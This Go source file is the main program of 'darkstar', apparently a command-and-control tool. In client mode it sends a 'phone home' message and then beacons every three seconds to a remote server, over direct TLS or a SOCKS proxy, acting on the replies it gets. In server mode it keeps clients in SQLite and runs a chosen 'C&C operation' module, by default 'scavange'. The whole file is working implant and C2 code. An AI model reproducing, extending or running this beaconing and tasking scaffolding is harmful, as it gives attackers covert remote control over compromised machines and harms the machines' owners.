package main

import (
	"flag"
	"fmt"
	"log"
	"os"
	"strconv"
	"strings"
	"time"

	"github.com/AlexsJones/darkstar/database"
	"github.com/AlexsJones/darkstar/net/client"
	"github.com/AlexsJones/darkstar/net/data"
	"github.com/AlexsJones/darkstar/net/server"
	"github.com/AlexsJones/darkstar/tls"
	"github.com/jinzhu/gorm"
	_ "github.com/jinzhu/gorm/dialects/sqlite"
	"golang.org/x/net/proxy"
)

func main() {
	var mode = flag.String("mode", "server", "Darkstar run mode")
	var clientPort = flag.Int("clientport", 8080, "Client port")
	var serverHostAddress = flag.String("serverhostaddress", "0.0.0.0", "Remote darkstar server address")
	var serverPort = flag.Int("serverport", 8080, "Server port")
	var serverModule = flag.String("module", "scavange", "Sets the remote C&C operation")
	var serverpath = flag.String("serverdbpath", "darkstar.db", "Set the sqlite3 database")
	var transportMode = flag.String("transportmode", "SOCKS", "SOCKS or DIRECTTLS")
	var socksProxyAddress = flag.String("socksproxy", "", "Set the remote socks proxy server to connect too")
	var socksProxyPort = flag.String("socksport", "", "Set the remote socks proxy port to connect too")
	var socksProxyUser = flag.String("socksuser", "", "Add a remote user to authenticate with")
	var socksProxyPass = flag.String("sockspass", "", "Add a remote password to authenticate with")
	flag.Parse()

	switch *mode {
	case "client":

		//Create the initial phone home message------------------------------------
		out := data.CreateMessage()
		//-------------------------------------------------------------------------

		//TLS Mode configuration --------------------------------------------------
		tlsConfiguration := &tls.Configuration{Host: "", ValidFrom: "", ValidFor: 365 * 24 * time.Hour, IsCA: false,
			RSABits: 2048, EcdsaCurve: "", CertPath: "client.pem", KeyPath: "client.key"}

		if err := tls.GenerateCertificates(tlsConfiguration); err != nil {
			os.Exit(1)
		}
		// ------------------------------------------------------------------------
		//SOCKS Mode configuration ------------------------------------------------
		var auth *proxy.Auth
		if *socksProxyUser != "" && *socksProxyPass != "" {
			auth = &proxy.Auth{User: *socksProxyUser, Password: *socksProxyPass}
		} else {
			auth = nil
		}

		config := &client.Configuration{
			Address: *serverHostAddress, CertPath: tlsConfiguration.CertPath, KeyPath: tlsConfiguration.KeyPath, Port: *clientPort,
			Auth: auth, SleepTime: time.Second * 3}
		//Sends the initial client message
		for {
			var bytesout []byte
			var num int
			if strings.Compare(*transportMode, "DIRECTTLS") == 0 {
				log.Println("Using DIRECTTLS sender")
				bytesout, num = client.SendTLS(config, string(out))
			} else {
				log.Println("Using SOCKS sender")

				config.ProxyAddress = *socksProxyAddress
				prt, err := strconv.Atoi(*socksProxyPort)
				if err != nil {
					panic(err)
				}
				config.ProxyPort = prt

				bytesout, num = client.SendSOCKS(config, string(out))
			}
			processedResponse, shouldSend := client.ResponseProcessor(bytesout[:num])
			if shouldSend {
				log.Println("-------------------Parsed response from server and sending an update-------------------")

				if strings.Compare(*transportMode, "DIRECTTLS") == 0 {
					log.Println("Using DIRECTTLS sender")
					bytesout, num = client.SendTLS(config, processedResponse)
				} else {
					log.Println("Using SOCKS sender")

					config.ProxyAddress = *socksProxyAddress
					prt, err := strconv.Atoi(*socksProxyPort)
					if err != nil {
						panic(err)
					}
					config.ProxyPort = prt

					bytesout, num = client.SendSOCKS(config, processedResponse)
				}

			}
			time.Sleep(config.SleepTime)
		}

	default:
		// Connect to database ----------------------------------------------------
		db, err := gorm.Open("sqlite3", *serverpath)
		if err != nil {
			fmt.Println(err.Error())
			os.Exit(1)
		}
		defer db.Close()

		//Generate tables...
		database.AutoMigrate(db)
		// ------------------------------------------------------------------------

		// tls generate certs -----------------------------------------------------
		tlsConfiguration := &tls.Configuration{Host: "", ValidFrom: "", ValidFor: 365 * 24 * time.Hour, IsCA: false,
			RSABits: 2048, EcdsaCurve: "", CertPath: "server.pem", KeyPath: "server.key"}

		if err := tls.GenerateCertificates(tlsConfiguration); err != nil {
			os.Exit(1)
		}
		// ------------------------------------------------------------------------
		conf := &server.Configuration{Address: "0.0.0.0", CertPath: tlsConfiguration.CertPath, KeyPath: tlsConfiguration.KeyPath,
			Port:          *serverPort,
			ClientHandler: server.ClientHandler,
			ModuleName:    *serverModule,
			Database:      db,
		}
		if strings.Compare(*transportMode, "DIRECTTLS") == 0 {
			log.Println("Using DIRECTTLS server")
			if err := server.RunTLS(conf); err != nil {
				log.Printf(err.Error())
			}
		} else {
			log.Println("Using SOCKS server")
			if err := server.Run(conf); err != nil {
				log.Printf(err.Error())
			}
		}
	}
}
